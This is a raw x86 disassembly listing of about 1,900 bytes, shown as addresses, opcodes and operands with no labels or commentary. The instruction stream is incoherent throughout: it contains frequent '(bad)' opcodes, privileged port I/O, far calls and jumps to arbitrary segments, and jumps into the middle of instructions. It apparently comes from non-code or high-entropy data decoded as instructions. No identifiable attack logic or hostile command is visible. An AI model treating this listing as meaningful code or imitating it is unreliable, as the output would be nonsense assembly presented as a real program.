  4098dc:	inc    BYTE PTR [edx-0x6f67a279]
  4098e2:	in     al,dx
  4098e3:	dec    esi
  4098e4:	(bad)  
  4098e5:	ins    DWORD PTR es:[edi],dx
  4098e6:	dec    edx
  4098e7:	fild   DWORD PTR [ecx+0x31]
  4098ea:	repnz daa 
  4098ec:	arpl   WORD PTR [edi],sp
  4098ee:	adc    eax,0xaecb4d2a
  4098f3:	push   ebp
  4098f4:	inc    esp
  4098f5:	xor    ebx,eax
  4098f7:	loop   0x40995f
  4098f9:	push   ebx
  4098fa:	dec    ebx
  4098fb:	jno    0x40988f
  4098fd:	or     al,dh
  4098ff:	jno    0x40994b
  409901:	call   0x65b8:0x50b57545
  409908:	add    bl,BYTE PTR [edi]
  40990a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40990b:	xchg   ebx,eax
  40990c:	aas    
  40990d:	popa   
  40990e:	pop    ebx
  40990f:	or     esp,DWORD PTR [esi-0x312a8efa]
  409915:	sbb    eax,0xe698bf02
  40991a:	pop    esi
  40991b:	xlat   BYTE PTR ds:[ebx]
  40991c:	rcl    BYTE PTR [ebx-0x4],1
  40991f:	jp     0x4098db
  409921:	jns    0x40992a
  409923:	popa   
  409924:	loop   0x409996
  409926:	sbb    eax,0x10ef0da5
  40992b:	cld    
  40992c:	cdq    
  40992d:	fidivr DWORD PTR [edi+edi*8+0x48a4c2]
  409934:	adc    DWORD PTR [edi-0x3a390fd],0xef8acfa9
  40993e:	(bad)  
  40993f:	jmp    0x62c5:0xd9cc0769
  409946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409947:	jge    0x409976
  409949:	ins    DWORD PTR es:[edi],dx
  40994a:	mov    eax,0xc328281a
  40994f:	sar    DWORD PTR fs:[edi+eiz*2],0xa3
  409954:	sub    DWORD PTR [ecx+0x5b],ecx
  409957:	cld    
  409958:	inc    esp
  409959:	aaa    
  40995a:	lock push ebp
  40995c:	fidiv  WORD PTR [esi-0x20]
  40995f:	cs inc ecx
  409961:	retf   
  409962:	inc    esi
  409963:	xchg   esi,eax
  409964:	inc    ebp
  409965:	pushf  
  409966:	mov    DWORD PTR [ecx-0x3fc0f5c2],esp
  40996c:	pop    ds
  40996d:	outs   dx,DWORD PTR ds:[esi]
  40996e:	imul   eax,DWORD PTR [ecx+0x10e6d04a],0xbc9b87f6
  409978:	lods   eax,DWORD PTR ds:[esi]
  409979:	push   0x76
  40997b:	arpl   WORD PTR [ebp+0x71ec446d],cx
  409981:	xchg   DWORD PTR [ebp+0x4097203e],esi
  409987:	out    dx,eax
  409988:	cli    
  409989:	xor    ebx,DWORD PTR [ebp+0x33088f15]
  40998f:	adc    BYTE PTR [ecx+0xe],al
  409992:	inc    edx
  409993:	test   eax,0x57c1b9d1
  409998:	pop    eax
  409999:	ins    BYTE PTR es:[edi],dx
  40999a:	sub    BYTE PTR [ebp+0x551eca9e],dh
  4099a0:	cmp    eax,0x13e8728
  4099a5:	(bad)  
  4099a6:	call   0x6a29dd9b
  4099ab:	push   ebx
  4099ac:	call   0xd065bbf0
  4099b1:	sti    
  4099b2:	and    eax,0xb0274441
  4099b7:	push   ebx
  4099b8:	ja     0x409a0c
  4099ba:	xor    BYTE PTR [ebp-0x27],dl
  4099bd:	(bad)  
  4099be:	std    
  4099bf:	out    dx,al
  4099c0:	mov    edi,0x22d776a3
  4099c5:	mov    eax,0x69fe1d82
  4099ca:	lods   al,BYTE PTR ds:[esi]
  4099cb:	dec    BYTE PTR ds:0xa765e27d
  4099d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099d2:	mov    ch,0xd7
  4099d4:	data16 (bad) 
  4099d6:	dec    esp
  4099d7:	inc    esi
  4099d8:	retf   0x8b39
  4099db:	and    BYTE PTR [edx-0x35],bh
  4099de:	test   BYTE PTR [ebp-0x214678dd],ch
  4099e4:	or     al,BYTE PTR [eax+esi*4-0x21]
  4099e8:	adc    BYTE PTR [esi+0x70346e03],al
  4099ee:	and    edx,DWORD PTR [ecx]
  4099f0:	dec    ebp
  4099f1:	mov    es,WORD PTR [esi]
  4099f3:	ret    0x2a62
  4099f6:	ja     0x409a3b
  4099f8:	clc    
  4099f9:	mov    eax,DWORD PTR [esi]
  4099fb:	iret   
  4099fc:	mov    ds:0x544cfbc5,al
  409a01:	mov    al,0x30
  409a03:	bound  eax,QWORD PTR [eax+0x3c4f421d]
  409a09:	lds    edx,FWORD PTR [edi]
  409a0b:	xor    al,BYTE PTR [edx]
  409a0d:	xchg   ecx,eax
  409a0e:	inc    ebx
  409a0f:	sahf   
  409a10:	cli    
  409a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a12:	xor    eax,DWORD PTR [esp+esi*8]
  409a15:	stos   BYTE PTR es:[edi],al
  409a16:	mov    dx,0x6b33
  409a1a:	jmp    edx
  409a1c:	adc    esp,DWORD PTR [esi]
  409a1e:	retf   
  409a1f:	sbb    al,0xde
  409a21:	jl     0x4099ed
  409a23:	or     BYTE PTR [esi-0x2117bb52],dl
  409a29:	sub    ebx,DWORD PTR [esi-0x3326d528]
  409a2f:	ja     0x409a73
  409a31:	jne    0x4099e1
  409a33:	mov    ch,0xe6
  409a35:	aam    0x16
  409a37:	repnz dec ebx
  409a39:	jle    0x409a2a
  409a3b:	mov    bl,0x7b
  409a3d:	push   ss
  409a3e:	js     0x409a13
  409a40:	mov    edx,0xd1583692
  409a45:	jae    0x409ab3
  409a47:	cmp    al,0x48
  409a49:	mov    esi,0xf01768b9
  409a4e:	add    esp,DWORD PTR [edx]
  409a50:	fstp   QWORD PTR [ecx-0x8]
  409a53:	lods   eax,DWORD PTR ds:[esi]
  409a54:	push   0x8903d687
  409a59:	push   ss
  409a5a:	inc    ebx
  409a5b:	popf   
  409a5c:	jle    0x4099f7
  409a5e:	int3   
  409a5f:	dec    edx
  409a60:	inc    ebx
  409a61:	or     DWORD PTR [ebx+eiz*1+0x2768c9cd],edx
  409a68:	cmp    BYTE PTR [ebx],ah
  409a6a:	pop    es
  409a6b:	popf   
  409a6c:	or     al,0x4b
  409a6e:	sti    
  409a6f:	dec    ecx
  409a70:	sub    bl,cl
  409a72:	nop
  409a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a74:	or     ah,BYTE PTR [eax-0x8]
  409a77:	adc    eax,0xf915ffe7
  409a7c:	aas    
  409a7d:	push   0xd77a7543
  409a82:	mov    bh,0x2a
  409a84:	push   edi
  409a85:	mov    ah,0xf8
  409a87:	sub    DWORD PTR [edi],esi
  409a89:	inc    esi
  409a8a:	pop    ebp
  409a8b:	in     eax,0xa0
  409a8d:	xchg   ecx,eax
  409a8e:	mov    bl,0x7
  409a90:	mov    ch,0xa8
  409a92:	inc    ebx
  409a93:	out    dx,al
  409a94:	rcr    bh,0x63
  409a97:	sbb    edi,DWORD PTR ds:0xbabc9f45
  409a9d:	jecxz  0x409a5f
  409a9f:	pop    ds
  409aa0:	xlat   BYTE PTR ds:[ebx]
  409aa1:	je     0x409b15
  409aa3:	mov    bh,0xa5
  409aa5:	in     eax,0xc6
  409aa7:	mov    ch,0xb4
  409aa9:	shl    BYTE PTR [esi-0x67],cl
  409aac:	popf   
  409aad:	pop    ecx
  409aae:	outs   dx,BYTE PTR ds:[esi]
  409aaf:	dec    edi
  409ab0:	pop    eax
  409ab1:	popa   
  409ab2:	in     eax,dx
  409ab3:	shr    BYTE PTR [ecx],1
  409ab5:	repnz push es
  409ab7:	inc    ecx
  409ab8:	push   edi
  409ab9:	sub    BYTE PTR [ebp+0x51d4e5b4],dh
  409abf:	mov    ds:0xe200a58a,al
  409ac4:	xlat   BYTE PTR fs:[ebx]
  409ac6:	mov    ebx,0xe8e5c603
  409acb:	mov    ds:0x7586e6ad,eax
  409ad0:	jbe    0x409aef
  409ad2:	scas   al,BYTE PTR es:[edi]
  409ad3:	(bad)  
  409ad4:	aas    
  409ad5:	sub    eax,DWORD PTR [edi+0x18]
  409ad8:	retf   
  409ad9:	adc    cl,BYTE PTR [ecx]
  409adb:	popa   
  409adc:	into   
  409add:	mov    DWORD PTR [esi-0x3c68fb87],edx
  409ae3:	inc    edi
  409ae4:	pop    edx
  409ae5:	pushf  
  409ae6:	fs push ebp
  409ae8:	in     al,dx
  409ae9:	pop    esi
  409aea:	inc    edx
  409aeb:	arpl   cx,bp
  409aed:	push   0x35
  409aef:	frstor [ebx-0x4c6e268e]
  409af5:	(bad)  
  409af6:	xchg   ebp,eax
  409af7:	ja     0x409a90
  409af9:	mov    cl,0xd6
  409afb:	xor    eax,0x757d9324
  409b00:	or     dl,BYTE PTR [edx+0x7]
  409b03:	add    al,BYTE PTR [ecx+ecx*2]
  409b06:	out    dx,eax
  409b07:	push   ecx
  409b08:	jnp    0x409ab9
  409b0a:	ins    DWORD PTR es:[edi],dx
  409b0b:	int    0x4
  409b0d:	mov    eax,0x299c20e9
  409b12:	cmp    DWORD PTR [eax],edx
  409b14:	adc    eax,0x32d567b4
  409b19:	rcl    BYTE PTR [ebp-0x46f9b374],1
  409b1f:	add    al,0x33
  409b21:	add    eax,0x4a0a528d
  409b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b27:	cmp    eax,0xe2e76368
  409b2c:	ins    DWORD PTR es:[edi],dx
  409b2d:	imul   ebp,DWORD PTR [ebx-0x2a],0xffffffcd
  409b31:	or     edi,esi
  409b33:	loope  0x409b8d
  409b35:	in     eax,0x84
  409b37:	scas   al,BYTE PTR es:[edi]
  409b38:	or     BYTE PTR [ebp+0x17],0xa7
  409b3c:	cwde   
  409b3d:	cmc    
  409b3e:	mov    esi,0x4a9c552a
  409b43:	ins    BYTE PTR es:[edi],dx
  409b44:	dec    eax
  409b45:	enterw 0xc780,0xb7
  409b4a:	mov    bh,0x56
  409b4c:	(bad)  
  409b4d:	mov    ah,0xb8
  409b4f:	adc    esi,DWORD PTR [ebx]
  409b51:	dec    ecx
  409b52:	lods   al,BYTE PTR ds:[esi]
  409b53:	sahf   
  409b54:	sar    DWORD PTR [esi-0x39964b30],cl
  409b5a:	add    ebx,ebp
  409b5c:	pop    ecx
  409b5d:	cmp    DWORD PTR [ebx+0x5bd48069],esp
  409b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b64:	ret    0xdfc8
  409b67:	fisub  WORD PTR [edx-0x4c8574a7]
  409b6d:	xor    ch,ch
  409b6f:	(bad)  
  409b70:	das    
  409b71:	sub    DWORD PTR [ecx+0x40367096],0xb
  409b78:	loop   0x409b90
  409b7a:	or     eax,0x8b279f9
  409b7f:	xchg   esp,eax
  409b80:	pop    es
  409b81:	pop    edi
  409b82:	cmp    esp,DWORD PTR [ecx]
  409b84:	mov    eax,ds:0xb7212633
  409b89:	loop   0x409b20
  409b8b:	(bad)  
  409b8c:	retf   
  409b8d:	dec    eax
  409b8e:	xor    BYTE PTR [esi+0x45cea06],al
  409b94:	test   eax,0xa242413a
  409b99:	or     edi,eax
  409b9b:	push   esp
  409b9c:	mov    dl,0x7e
  409b9e:	xor    al,0x1b
  409ba0:	test   al,0x8a
  409ba2:	leave  
  409ba3:	lds    esp,FWORD PTR [eax]
  409ba5:	mov    eax,0xc006b407
  409baa:	div    BYTE PTR [eax+0x5c9b46b6]
  409bb0:	gs mov esi,ecx
  409bb3:	sbb    ebx,edx
  409bb5:	test   al,0x86
  409bb7:	popf   
  409bb8:	cmp    DWORD PTR [ebx+0x7a],ecx
  409bbb:	sbb    bh,BYTE PTR es:[ecx-0x3c]
  409bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bc0:	addr16 xchg ebx,eax
  409bc2:	clc    
  409bc3:	push   ss
  409bc4:	not    DWORD PTR fs:0xe360c7f9
  409bcb:	bound  ecx,QWORD PTR [esi-0x6edebc3]
  409bd1:	fst    QWORD PTR [ebp-0x6d]
  409bd4:	in     eax,dx
  409bd5:	adc    ebx,esi
  409bd7:	stos   DWORD PTR es:[edi],eax
  409bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd9:	adc    edi,DWORD PTR [ebx+0x5c]
  409bdc:	jb     0x409bdb
  409bde:	inc    ecx
  409bdf:	pop    ebx
  409be0:	adc    DWORD PTR [edi+ebx*2-0x11],ebp
  409be4:	daa    
  409be5:	inc    edx
  409be6:	lods   al,BYTE PTR ds:[esi]
  409be7:	mov    ds:0xb8905eb7,al
  409bec:	mov    edx,0x1ee9b08e
  409bf1:	push   0x39bfa50a
  409bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf7:	sahf   
  409bf8:	jge    0x409b8d
  409bfa:	gs aad 0x25
  409bfd:	mov    eax,0xa396167a
  409c02:	jns    0x409c23
  409c04:	pushw  cs
  409c06:	jmp    0x1072:0x9bf20cd4
  409c0d:	and    al,0x10
  409c0f:	lea    ecx,[esp+esi*8]
  409c12:	sbb    DWORD PTR [ebx+0x28],ebp
  409c15:	retf   0x3253
  409c18:	repz xor ch,ch
  409c1b:	xor    BYTE PTR [ebp-0x13],cl
  409c1e:	test   eax,0x492cff6
  409c23:	ret    
  409c24:	call   0x89d4:0xd512ce14
  409c2b:	xor    bl,BYTE PTR [eax]
  409c2d:	int3   
  409c2e:	cmc    
  409c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c30:	jmp    0x2daa:0x67b0f6fc
  409c37:	mov    al,0x4d
  409c39:	gs mov esi,eax
  409c3c:	outs   dx,BYTE PTR ds:[esi]
  409c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3e:	and    al,al
  409c40:	jae    0x409bd2
  409c42:	pop    eax
  409c43:	aas    
  409c44:	inc    ebp
  409c45:	inc    esp
  409c46:	int3   
  409c47:	mov    bl,0x5e
  409c49:	mov    al,ds:0x6f669222
  409c4e:	adc    DWORD PTR [eax-0xdfe82a1],esp
  409c54:	push   ss
  409c55:	push   0x680168de
  409c5a:	in     al,dx
  409c5b:	xor    edi,DWORD PTR [esi+0x35]
  409c5e:	mov    ch,0x78
  409c60:	push   ecx
  409c61:	cld    
  409c62:	or     bh,BYTE PTR [ecx+0x15]
  409c65:	popf   
  409c66:	push   ecx
  409c67:	popf   
  409c68:	add    BYTE PTR [edi],0x45
  409c6b:	arpl   WORD PTR [edi+0x66ff517c],di
  409c71:	sar    esp,cl
  409c73:	mov    eax,ds:0x89b471c0
  409c78:	test   eax,0x486ec251
  409c7d:	mov    dl,0x86
  409c7f:	mov    WORD PTR [edx],fs
  409c81:	mov    DWORD PTR [esi-0x5],ebp
  409c84:	into   
  409c85:	sbb    al,BYTE PTR [esi-0xad351d4]
  409c8b:	inc    eax
  409c8c:	call   0x48d1:0x232c1dfd
  409c93:	out    dx,al
  409c94:	int3   
  409c95:	test   eax,0xbe2cf293
  409c9a:	xor    dl,BYTE PTR [edx+0x4]
  409c9d:	jg     0x409d03
  409c9f:	fisttp QWORD PTR [edx]
  409ca1:	shl    BYTE PTR fs:[eax-0x1aa214df],0x76
  409ca9:	inc    edi
  409caa:	dec    ebp
  409cab:	mov    DWORD PTR [ebp-0x6b],ebx
  409cae:	push   ebx
  409caf:	test   eax,0x91c76d21
  409cb4:	ja     0x409c6f
  409cb6:	mov    esi,0xe9878450
  409cbb:	pop    ecx
  409cbc:	push   ss
  409cbd:	jle    0x409cb7
  409cbf:	sar    BYTE PTR [ebx-0x7fe6948],cl
  409cc5:	mov    al,ds:0x89cf0c95
  409cca:	sub    cl,BYTE PTR [eax+0x42]
  409ccd:	addr16 mov edi,0x5d6a41df
  409cd3:	xor    eax,0xb402ebdb
  409cd8:	sbb    edx,DWORD PTR [edx+0x77]
  409cdb:	repnz add ecx,DWORD PTR ds:0x8ad0fee4
  409ce2:	cld    
  409ce3:	out    0x9d,eax
  409ce5:	xchg   DWORD PTR [edi+0x3c718a9],ebx
  409ceb:	mov    DWORD PTR [ecx],ebp
  409ced:	popa   
  409cee:	mov    dl,0x3d
  409cf0:	pop    bx
  409cf2:	inc    ecx
  409cf3:	aad    0xa8
  409cf5:	mov    ecx,0xb14a82d0
  409cfa:	dec    ebp
  409cfb:	jmp    0xe7b7:0xf79b2c89
  409d02:	stos   DWORD PTR es:[edi],eax
  409d03:	add    al,0xd9
  409d05:	mov    DWORD PTR [ebx+ecx*8],ebp
  409d08:	lea    ecx,[edx-0x3b618e6b]
  409d0e:	inc    eax
  409d0f:	leave  
  409d10:	sub    esp,DWORD PTR [edi-0x438f9b2a]
  409d16:	xor    dh,al
  409d18:	pop    esp
  409d19:	leave  
  409d1a:	sub    dl,BYTE PTR [ecx]
  409d1c:	pop    ss
  409d1d:	clc    
  409d1e:	ins    DWORD PTR es:[edi],dx
  409d1f:	adc    ch,BYTE PTR [edi]
  409d21:	and    edx,eax
  409d23:	and    eax,0xd7818b8d
  409d28:	repz shl dl,cl
  409d2b:	shl    BYTE PTR [edi],1
  409d2d:	addr16 in eax,0x43
  409d30:	push   edi
  409d31:	in     eax,dx
  409d32:	sti    
  409d33:	std    
  409d34:	addr16 in al,dx
  409d36:	lods   eax,DWORD PTR ds:[esi]
  409d37:	add    BYTE PTR [esi+ebp*2-0x45ae27ee],0xbd
  409d3f:	scas   al,BYTE PTR es:[edi]
  409d40:	mov    dx,0x472c
  409d44:	dec    ecx
  409d45:	xor    BYTE PTR [esi-0x35],al
  409d48:	aam    0xdc
  409d4a:	in     al,dx
  409d4b:	mul    ecx
  409d4d:	inc    edi
  409d4e:	test   al,0xb9
  409d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d51:	ds je  0x409ce6
  409d54:	cmp    al,0xac
  409d56:	adc    al,0x3b
  409d58:	jge    0x409d74
  409d5a:	mov    ds:0x3565dc1,eax
  409d5f:	aam    0x53
  409d61:	add    bl,0xaa
  409d64:	lahf   
  409d65:	pop    ds
  409d66:	shl    DWORD PTR [edx],cl
  409d68:	pop    esp
  409d69:	push   edi
  409d6a:	and    al,0xa
  409d6c:	adc    al,0xc6
  409d6e:	add    DWORD PTR [eax+0x20910d7d],ebx
  409d74:	(bad)  
  409d75:	jno    0x409dba
  409d77:	pop    ss
  409d78:	pop    ecx
  409d79:	xchg   BYTE PTR ds:0x8bf7b1f1,ah
  409d7f:	xchg   esp,eax
  409d80:	fldlg2 
  409d82:	push   edi
  409d83:	dec    esp
  409d84:	mov    ds:0x296ad8c8,al
  409d89:	sbb    esi,DWORD PTR [eax]
  409d8b:	sbb    ch,0x5e
  409d8e:	add    dh,BYTE PTR [ecx+esi*8-0x62a0a2e]
  409d95:	(bad)  
  409d96:	xor    DWORD PTR [esi-0x6c],ebp
  409d99:	mov    ebp,0x9478401e
  409d9e:	(bad)  
  409d9f:	jecxz  0x409dce
  409da1:	cli    
  409da2:	jb     0x409df4
  409da4:	jmp    0x409e03
  409da6:	adc    al,0x58
  409da8:	sar    DWORD PTR [ebx],1
  409daa:	xchg   edx,eax
  409dab:	and    eax,0x4a22ddba
  409db0:	mov    edx,0x62e5da98
  409db5:	pop    edi
  409db6:	(bad)  
  409db7:	std    
  409db8:	lods   al,BYTE PTR ds:[esi]
  409db9:	(bad)  
  409dba:	jnp    0x409dad
  409dbc:	mov    dh,0x27
  409dbe:	xor    al,0x7
  409dc0:	mov    dh,0xd6
  409dc2:	pop    ds
  409dc3:	sbb    al,0x6c
  409dc5:	pop    ds
  409dc6:	add    cl,BYTE PTR [edi-0x5046a1bf]
  409dcc:	xchg   edx,eax
  409dcd:	test   DWORD PTR [edi+ecx*1-0x3cfdcacd],edi
  409dd4:	sbb    eax,0x29dcd710
  409dd9:	or     BYTE PTR [eax],dh
  409ddb:	inc    esi
  409ddc:	and    dl,BYTE PTR ds:0x9b5281ac
  409de2:	out    dx,eax
  409de3:	xchg   edx,eax
  409de4:	mov    DWORD PTR [eax+eiz*2-0x2d1d54c3],0xfebda978
  409def:	adc    al,0xbd
  409df1:	push   esp
  409df2:	inc    ebx
  409df3:	lods   al,BYTE PTR ds:[esi]
  409df4:	das    
  409df5:	outs   dx,BYTE PTR ds:[esi]
  409df6:	dec    eax
  409df7:	aad    0xf1
  409df9:	jp     0x409df2
  409dfb:	ja     0x409e0f
  409dfd:	mov    ss,WORD PTR ds:0xb243cc34
  409e03:	jns    0x409e6e
  409e05:	(bad)  
  409e07:	in     eax,dx
  409e08:	jp     0x409e52
  409e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e0b:	and    esp,edx
  409e0d:	int3   
  409e0e:	aas    
  409e0f:	out    0x2c,al
  409e11:	pop    ebp
  409e12:	sti    
  409e13:	aam    0x21
  409e15:	hlt    
  409e16:	adc    ecx,DWORD PTR [edi-0x3d993aad]
  409e1c:	dec    edx
  409e1d:	(bad)  
  409e1e:	cli    
  409e1f:	inc    ebx
  409e20:	mov    edx,0x574a20f5
  409e25:	test   eax,0x5b77baa4
  409e2a:	sbb    DWORD PTR [esi-0x3c],ebp
  409e2d:	ffree  st(2)
  409e2f:	mov    edx,0x95db22ad
  409e34:	or     DWORD PTR [eax-0x3a6a5d44],esp
  409e3a:	cmp    esp,DWORD PTR [ebp-0x411eb6c]
  409e40:	jl     0x409dc7
  409e42:	xchg   ebp,eax
  409e43:	popa   
  409e44:	add    BYTE PTR [edi+0x45],al
  409e47:	jns    0x409e99
  409e49:	inc    edx
  409e4a:	jle    0x409dd5
  409e4c:	jmp    0x409e26
  409e4e:	mov    ebp,0x12ff01a6
  409e53:	mov    WORD PTR [edi-0x53],es
  409e56:	push   edi
  409e57:	inc    eax
  409e58:	push   esi
  409e59:	pop    es
  409e5a:	mov    eax,ds:0x67dd0bbb
  409e5f:	popf   
  409e60:	push   ebx
  409e61:	jecxz  0x409e66
  409e63:	xor    BYTE PTR [edi],al
  409e65:	adc    eax,0x3547b66f
  409e6a:	adc    al,0x4d
  409e6c:	mov    eax,0x13bbba90
  409e71:	pop    edi
  409e72:	push   ebp
  409e73:	icebp  
  409e74:	test   eax,0xf402d7b
  409e79:	add    ebx,DWORD PTR [eax]
  409e7b:	add    BYTE PTR [edx],al
  409e7d:	and    eax,0x46196d69
  409e82:	mov    esi,0xedfa6e91
  409e87:	outs   dx,DWORD PTR ds:[esi]
  409e88:	scas   al,BYTE PTR es:[edi]
  409e89:	cli    
  409e8a:	retf   
  409e8b:	mov    ebx,DWORD PTR [esi+eax*8+0x4c]
  409e8f:	std    
  409e90:	je     0x409e9b
  409e92:	scas   eax,DWORD PTR es:[edi]
  409e93:	add    BYTE PTR [ebp-0x78],0xd
  409e97:	or     ebx,DWORD PTR [ebx+0x5a]
  409e9a:	push   ebx
  409e9b:	repnz add eax,0xaa49e412
  409ea1:	ret    
  409ea2:	mov    ds:0x358b564b,al
  409ea7:	fs (bad) 
  409eaa:	ins    DWORD PTR es:[edi],dx
  409eab:	xor    ebp,DWORD PTR [ebx]
  409ead:	mov    cl,0x13
  409eaf:	mov    dl,0x6f
  409eb1:	fidivr DWORD PTR [ebx+0x675ea121]
  409eb7:	xchg   ecx,eax
  409eb8:	popa   
  409eb9:	mov    WORD PTR [edi-0x5a5019e4],gs
  409ebf:	fisttp WORD PTR [edx]
  409ec1:	pop    ecx
  409ec2:	mov    esi,0xe24ae909
  409ec7:	dec    edi
  409ec8:	dec    edi
  409ec9:	jo     0x409ee1
  409ecb:	daa    
  409ecc:	add    BYTE PTR ds:0x7bde9aec,al
  409ed2:	(bad)  
  409ed3:	cld    
  409ed4:	push   esi
  409ed5:	xor    ebp,DWORD PTR [eax]
  409ed7:	xchg   eax,esp
  409ed9:	loope  0x409e8e
  409edb:	(bad)  
  409edc:	mov    eax,ds:0x76998d2b
  409ee1:	pop    es
  409ee2:	add    DWORD PTR [eax-0x43],0x8
  409ee6:	sub    eax,edx
  409ee8:	test   BYTE PTR [ebx+0x1b],ch
  409eeb:	(bad)  
  409eec:	test   eax,0x15007bf2
  409ef1:	sbb    eax,0x4c7226b0
  409ef6:	pop    esp
  409ef7:	push   ecx
  409ef8:	pushf  
  409ef9:	iret   
  409efa:	or     eax,0x84a0dcef
  409eff:	sbb    eax,0x41c4d7a3
  409f04:	sub    BYTE PTR [ebp-0x2],0xca
  409f08:	lods   al,BYTE PTR ds:[esi]
  409f09:	and    BYTE PTR [eax],ch
  409f0b:	out    dx,al
  409f0c:	jb     0x409eaf
  409f0e:	idiv   al
  409f10:	fisttp WORD PTR [ebp-0x6de613d7]
  409f16:	ds mov eax,0x6c88c53a
  409f1c:	pop    esp
  409f1d:	or     ebx,DWORD PTR [ecx-0x45]
  409f20:	gs in  eax,0x8f
  409f23:	mov    eax,ds:0x6004ee48
  409f28:	push   es
  409f29:	sahf   
  409f2a:	pop    es
  409f2b:	xlat   BYTE PTR ds:[ebx]
  409f2c:	fldenv [ecx-0x50e13b0d]
  409f32:	or     eax,DWORD PTR [edi]
  409f34:	jb     0x409f34
  409f36:	push   ss
  409f37:	cmp    DWORD PTR [edx+ebp*2+0x221dc3c9],0x35c6fe13
  409f42:	or     eax,0xdb83a895
  409f47:	mov    esp,0x98d7f290
  409f4c:	ds push 0xffffff9e
  409f4f:	(bad)  [edx+0x19]
  409f52:	xchg   edx,eax
  409f53:	loop   0x409f9d
  409f55:	call   0xaf96:0x7896c4d7
  409f5c:	mov    dl,0x11
  409f5e:	in     al,dx
  409f5f:	add    BYTE PTR [ecx],ah
  409f61:	xchg   ebp,eax
  409f62:	std    
  409f63:	out    0xd,eax
  409f65:	aas    
  409f66:	mov    ch,0xf1
  409f68:	imul   ecx,DWORD PTR [ebx],0x5e4aff49
  409f6e:	ds mov bh,bl
  409f71:	in     al,dx
  409f72:	sbb    al,ch
  409f74:	xor    eax,0xe09f50ce
  409f79:	iret   
  409f7a:	xor    ch,BYTE PTR [ebp-0x39]
  409f7d:	sbb    DWORD PTR [eax+0x30],0xc62a189f
  409f84:	sbb    BYTE PTR [ebp-0x2362902b],0x54
  409f8b:	pop    es
  409f8c:	push   cs
  409f8d:	or     esp,eax
  409f8f:	jg     0x409f31
  409f91:	jl     0x409f33
  409f93:	ret    
  409f94:	in     eax,0x50
  409f96:	test   eax,0x29c29f3b
  409f9b:	sbb    esi,DWORD PTR [edx+ebx*8-0x57]
  409f9f:	xchg   edx,eax
  409fa0:	xor    DWORD PTR [esi+0x1c52815],ebx
  409fa6:	(bad)  [eiz*4+0x1b2b8e3d]
  409fad:	adc    eax,0xdc809ab
  409fb2:	mov    al,ds:0xba056b23
  409fb7:	xchg   esp,eax
  409fb8:	mov    esi,0xecbbbbb8
  409fbd:	xchg   edx,ebp
  409fbf:	ret    
  409fc0:	cli    
  409fc1:	lea    edx,[eax+edi*4-0x1a]
  409fc5:	(bad)  
  409fc6:	sbb    BYTE PTR [ebp+esi*4-0x7349c5c4],bh
  409fcd:	mov    ebp,0x9cc06d04
  409fd2:	scas   al,BYTE PTR es:[edi]
  409fd3:	cmp    bl,BYTE PTR [ebp-0x61192db7]
  409fd9:	adc    al,0x1
  409fdb:	cdq    
  409fdc:	mov    eax,ds:0x4d5f0bf2
  409fe1:	sbb    BYTE PTR [edx],dl
  409fe3:	adc    al,0x9d
  409fe5:	xor    esp,edi
  409fe7:	xor    ah,bh
  409fe9:	mov    eax,0x6706a591
  409fee:	dec    edi
  409fef:	jp     0x409f7d
  409ff1:	and    DWORD PTR [edx],0x96f812af
  409ff7:	adc    DWORD PTR [edi],0x38
  409ffa:	adc    ch,BYTE PTR [ebx+0x16]
  409ffd:	in     eax,dx
  409ffe:	xchg   DWORD PTR [edi+0x38190463],eax
  40a004:	retf   0xfdb8
  40a007:	in     eax,dx
  40a008:	jne    0x409fcf
  40a00a:	push   ds
  40a00b:	or     edi,DWORD PTR [eax]
  40a00d:	cli    
  40a00e:	(bad)  
  40a00f:	mov    ah,0xc0
  40a011:	push   edi
  40a012:	ja     0x409fa3
  40a014:	adc    al,0xd6
  40a016:	leave  
  40a017:	add    al,0x7c
  40a019:	dec    edx
  40a01a:	mov    dl,0x0
  40a01c:	sbb    DWORD PTR [ebp+0x46],ebp
  40a01f:	push   ecx
  40a020:	les    esp,FWORD PTR [ebx+0x65]
  40a023:	mov    bl,0x23
  40a025:	xchg   esp,eax
  40a026:	in     eax,dx
  40a027:	rcl    BYTE PTR [ebx-0x7c],0x86
  40a02b:	retf   
  40a02c:	inc    eax
  40a02d:	lahf   
  40a02e:	not    BYTE PTR [edx+ebp*8+0x3b64c8b4]
  40a035:	push   0x178d6565
  40a03a:	xchg   esp,eax
  40a03b:	ret    
  40a03c:	xlat   BYTE PTR ds:[ebx]
  40a03d:	out    0x2b,al
  40a03f:	loopne 0x409fe2
  40a041:	shr    bh,0x4d
  40a044:	scas   al,BYTE PTR es:[edi]
  40a045:	into   
  40a046:	push   0x1082486c
  40a04b:	les    edx,FWORD PTR [edx+0x6faffb32]
  40a051:	push   ss
  40a052:	cmp    DWORD PTR [ebx+eiz*8+0x39],edi
  40a056:	in     eax,0xee
  40a058:	mov    edi,0xbe6f70dc
  40a05d:	add    DWORD PTR [edi+ecx*2+0x4e275251],esp
  40a064:	imul   ebp,DWORD PTR [ebx-0x1e8ca073],0xffffffef
  40a06b:	inc    esi
  40a06c:	fwait
  40a06d:	pusha  
  40a06e:	fstp   DWORD PTR ds:0xcdbf60cc
  40a074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a075:	adc    esi,edx
  40a077:	repz bound edx,QWORD PTR [edi-0x3c977c87]
  40a07e:	sbb    DWORD PTR [edi+0x48],ecx
  40a081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a082:	sub    al,0xb5
  40a084:	jmp    FWORD PTR [eax+0x6c]
  40a087:	scas   al,BYTE PTR es:[edi]
  40a088:	shl    BYTE PTR [ecx+0x64],1
  40a08b:	daa    
